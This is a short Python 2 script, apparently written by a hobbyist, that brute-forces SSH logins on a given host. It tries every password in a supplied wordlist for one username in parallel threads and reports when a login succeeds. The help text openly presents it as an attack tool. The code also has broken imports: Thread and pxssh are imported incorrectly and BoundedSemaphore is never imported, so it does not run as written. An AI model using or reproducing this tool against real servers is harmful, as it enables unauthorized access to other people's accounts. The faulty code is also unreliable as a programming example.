# -*- coding: utf-8 -*-
"""
Created on Sat Aug 11 10:22:24 2018

@author: bharg
"""

import optparse
import  pxssh
import time
import Thread
fail=0
connections_lock=BoundedSemaphore(value=1)
found=False
def connect(host,user,password,release):
    global fail
    global found
    try:
        s=pxssh.pxssh()
        s.login(host,user,password)
        print "Password Found"
        found=True
    except Exception, e:
        if "read_nonblocking" in str(e):
            fail+=1
            time.sleep(5)
            connect(host,user,password,False)
        elif "synchronize with original prompt" in str(e):
            time.sleep(2)
            connect(host,user,password,False)
    finally:
        if release:
            connections_lock.release()
        
        
        
    

def main():
    global found
    global fail
    parser = optparse.OptionParser("Usage: -H <HostName> -U <Username> -P <Password")
    parser.add_option("-H",dest="thost", type="string",help ="Enter the Host on which you want brute force ssh login")
    parser.add_option("-U", dest="username",type="string",help="Enter the username that on which you want to brute force")
    parser.add_option("-P",dest="passfile",type="string",help="Enter the password file which can be used for bruteforcing attack")
    (options,args)=parser.parse_args()
    if options.thost == None or options.username==None or options.passfile==None:
        print parser.usage
        exit(0)
    thost=options.thost
    username=options.username
    passfile=options.passfile
    f=open(passfile,"r")
    for line in f.readlines():
      
        if fail >5:
            print "Too many timeouts"
            exit(0)
        connections_lock.acquire()
        password=line.strip("\n")
        print " The password used in this iteration is %s "%password
        t= Thread(target=connect, args=(thost,username,password,True))
        t.start()
    
    


if __name__=="__main__":
    main()